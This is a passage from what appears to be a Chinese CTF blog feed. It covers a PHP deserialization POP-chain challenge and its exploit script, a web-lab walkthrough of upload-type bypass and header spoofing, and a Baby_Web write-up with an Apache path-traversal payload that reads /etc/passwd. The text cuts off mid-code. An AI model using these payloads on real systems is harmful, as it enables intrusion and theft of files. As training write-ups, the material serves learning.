class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wish&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">/***************************pop your 2022*****************************/</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**********************Try to See flag.php*****************************/</span><br></code></pre></td></tr></table></figure><p>首先呢，找漏洞点，在include函数这个位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>反推一下，谁可以调用append这个方法，__invoke魔术方法(当类被当作方法调用时，触发该方法),一般都是找   方法();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>在Make_a_Change类里有个__get魔术方法(当访问一个类中的属性不存在或者privite的时候，会被调用)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>谁可以去调用呢，Road_is_Long类里面的__toString魔术方法(当类被当作字符串去运行的时候调用)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>&#125;<br></code></pre></td></tr></table></figure><p>谁可以去调用__toString魔术方法呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>__wakeup反序列化的时候就会去调用，哪里会调用__toString呢，在preg_match这里</p><p>接下来编写exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Road_is_Long</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">string</span>-&gt;page;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;page)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can Not Enter 2022&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;page = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Try_Work_Hard</span></span>&#123;<br>    <span class="hljs-comment">#protected  $var;</span><br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;/flag&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Make_a_Change</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$effort</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;effort = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;effort;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$road1</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br><span class="hljs-variable">$road2</span>= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Road_is_Long</span>;<br><span class="hljs-variable">$try</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Try_Work_Hard</span>;<br><span class="hljs-variable">$make</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Make_a_Change</span>;<br><br><span class="hljs-variable">$road1</span>-&gt;page = <span class="hljs-variable">$road2</span>;  <span class="hljs-comment">//这里关键点，我们为什么不用road1，而是去用road2呢，因为road2才是实际上触发toStringmo&#x27;sh</span><br><span class="hljs-variable">$road2</span>-&gt;<span class="hljs-keyword">string</span> = <span class="hljs-variable">$make</span>;<br><span class="hljs-variable">$make</span>-&gt;effort=<span class="hljs-variable">$try</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$road1</span>));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全渗透测试</title>
    <link href="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <url>/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h4 id="1-gt-访问网站ip-x2F-up，找到网站首页的flag并进行提交"><a href="#1-gt-访问网站ip-x2F-up，找到网站首页的flag并进行提交" class="headerlink" title="1&gt; 访问网站ip&#x2F;up，找到网站首页的flag并进行提交"></a><strong>1&gt; 访问网站ip&#x2F;up，找到网站首页的flag并进行提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208102933799.png" alt="image-20221208102933799"></p><p>查看源代码，发现了flag.txt</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208102958646.png" alt="image-20221208102958646"></p><p>flag:sacasceafvdbtsd</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208103015753.png" alt="image-20221208103015753"></p><h4 id="2-gt-通过首页给的信息，获取本题的flag"><a href="#2-gt-通过首页给的信息，获取本题的flag" class="headerlink" title="2&gt; 通过首页给的信息，获取本题的flag"></a><strong>2&gt; 通过首页给的信息，获取本题的flag</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208125509016.png" alt="image-20221208125509016"></p><p>抓包然后修改文件类型，改成image&#x2F;jpeg</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208125532355.png" alt="image-20221208125532355"></p><p>发包就获得了flag sdv4sg8r9vd6bw6ddcw</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208125550903.png" alt="image-20221208125550903"></p><h4 id="3-gt-根据第二题的入口继续访问服务器的场景，通过代码提示得到flag提交"><a href="#3-gt-根据第二题的入口继续访问服务器的场景，通过代码提示得到flag提交" class="headerlink" title="3&gt; 根据第二题的入口继续访问服务器的场景，通过代码提示得到flag提交"></a><strong>3&gt; 根据第二题的入口继续访问服务器的场景，通过代码提示得到flag提交</strong></h4><p>跟第二题是一样的，改个文件类型，然后上传就好了</p><p>flag: KJIhnHbJIyhJIU</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208125943661.png" alt="image-20221208125943661"></p><p>4&gt; 根据第三题的入口继续访问服务器的场景，通过代码提示得到flag提交</p><p>疑似控分，真没意思</p><h4 id="7-gt-访问ip-x2F-7，将获得的flag提交"><a href="#7-gt-访问ip-x2F-7，将获得的flag提交" class="headerlink" title="7&gt; 访问ip&#x2F;7，将获得的flag提交"></a><strong>7&gt; 访问ip&#x2F;7，将获得的flag提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143636677.png" alt="image-20221208143636677"></p><p>这很容易让人联想到robots.txt</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143707754.png" alt="image-20221208143707754"></p><p>得到flag，这么页面禁止了鼠标，那就快捷键ctrl + U</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143731089.png" alt="image-20221208143731089"></p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143754949.png" alt="image-20221208143754949"></p><p>flag:e10adc3949ba59abbe56e057f20f883e</p><h4 id="8-gt-访问ip-x2F-8，将获得的flag提交"><a href="#8-gt-访问ip-x2F-8，将获得的flag提交" class="headerlink" title="8&gt; 访问ip&#x2F;8，将获得的flag提交"></a><strong>8&gt; 访问ip&#x2F;8，将获得的flag提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143839443.png" alt="image-20221208143839443"></p><h4 id="抓包添加x-forwarded-for头"><a href="#抓包添加x-forwarded-for头" class="headerlink" title="抓包添加x-forwarded-for头"></a><strong>抓包添加x-forwarded-for头</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143924365.png" alt="image-20221208143924365"></p><p>接着改UA</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208143957554.png" alt="image-20221208143957554"></p><p>flag:52533448e88b27e3f29892bcad491e05</p><h4 id="9-gt-访问ip-x2F-9，将获得的flag提交"><a href="#9-gt-访问ip-x2F-9，将获得的flag提交" class="headerlink" title="9&gt; 访问ip&#x2F;9，将获得的flag提交"></a><strong>9&gt; 访问ip&#x2F;9，将获得的flag提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144220055.png" alt="image-20221208144220055"></p><p>下载拖到kali里直接搜索flag{</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144331583.png" alt="image-20221208144331583"></p><h4 id="10-gt-访问ip-x2F-10，将获得的flag提交"><a href="#10-gt-访问ip-x2F-10，将获得的flag提交" class="headerlink" title="10&gt; 访问ip&#x2F;10，将获得的flag提交"></a><strong>10&gt; 访问ip&#x2F;10，将获得的flag提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144506969.png" alt="image-20221208144506969"></p><p>下载得到了一个文件</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144610738.png" alt="image-20221208144610738"></p><p>有点像八进制，转一下十进制</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144737686.png" alt="image-20221208144737686"></p><p>接着十进制转字符串</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144757396.png" alt="image-20221208144757396"></p><p>有点像base64，解一下</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144811757-16704820924281.png" alt="image-20221208144811757"></p><p>flag:ISCC{N0_0ne_can_st0p_y0u}</p><h4 id="访问ip-x2F-11，将获得的flag提交"><a href="#访问ip-x2F-11，将获得的flag提交" class="headerlink" title="访问ip&#x2F;11，将获得的flag提交"></a><strong>访问ip&#x2F;11，将获得的flag提交</strong></h4><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208144920462.png" alt="image-20221208144920462"></p><p>直接截图</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208145056356.png" alt="image-20221208145056356"></p><p>flag:ceb6c970658f31504a901b89dcd3e461</p><h4 id="访问ip-x2F-12，将获得的flag提交"><a href="#访问ip-x2F-12，将获得的flag提交" class="headerlink" title="访问ip&#x2F;12，将获得的flag提交"></a><strong>访问ip&#x2F;12，将获得的flag提交</strong></h4><p>看文件末尾，有个FF D9</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208151140556.png" alt="image-20221208151140556"></p><p>在网上找个在线修改jpg图片的工具</p><p><a href="https://online.officerecovery.com/cn/fix-damaged-photo-file-online/">https://online.officerecovery.com/cn/fix-damaged-photo-file-online/</a></p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208152417490.png" alt="image-20221208152417490"></p><p>flag:mAgic_byTes</p><h4 id="访问ip-x2F-13，将获得的flag提交"><a href="#访问ip-x2F-13，将获得的flag提交" class="headerlink" title="访问ip&#x2F;13，将获得的flag提交"></a><strong>访问ip&#x2F;13，将获得的flag提交</strong></h4><p>这题直接看源代码</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208152608390.png" alt="image-20221208152608390"></p><p>让我们输入zhimakaimen，修改一下html标签的限制长度，然后抓包修改一下cookie</p><p><img src="/2022/12/08/Web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20221208152710045.png" alt="image-20221208152710045"></p><p>flag:flag{55e7dd3016ce4ac57b9a0f56af12f7c2}</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Baby_Web</title>
    <link href="/2022/12/06/BabyWeb/"/>
    <url>/2022/12/06/BabyWeb/</url>
    
    <content type="html"><![CDATA[<p>题目首页</p><p><img src="/2022/12/06/BabyWeb/image-20221206164219690.png" alt="image-20221206164219690"></p><p>通过扫描发现了一个特殊的路径</p><p>&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd</p><p>这个路径是一个apache的漏洞，可以目录遍历，执行命令</p><p>测了一下命令执行是不可以的，可以目录遍历</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/cgi-bin/.%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>e/etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2022/12/06/BabyWeb/image-20221206164252785.png" alt="image-20221206164252785"></p><p>然后根据源代码里的提示信息，查看一下index.php.txt文件</p><p><img src="/2022/12/06/BabyWeb/image-20221206164309334.png" alt="image-20221206164309334"></p><p><img src="/2022/12/06/BabyWeb/image-20221206164317820.png" alt="image-20221206164317820"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;h1&gt;Welcome To GFCTF <span class="hljs-number">12</span>th!!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Class.php&quot;</span>;<br><span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Temp</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-variable">$temp</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]);<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;<br></code></pre></td></tr></table></figure><p>再查看Class.php.txt</p><p><img src="/2022/12/06/BabyWeb/image-20221206164326650.png" alt="image-20221206164326650"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;main&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!!&quot;</span>);<br>Class Temp&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$date</span>=[<span class="hljs-string">&#x27;version&#x27;</span>=&gt;<span class="hljs-string">&#x27;1.0&#x27;</span>,<span class="hljs-string">&#x27;img&#x27;</span>=&gt;<span class="hljs-string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$template</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;date = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;date,<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTempName</span>(<span 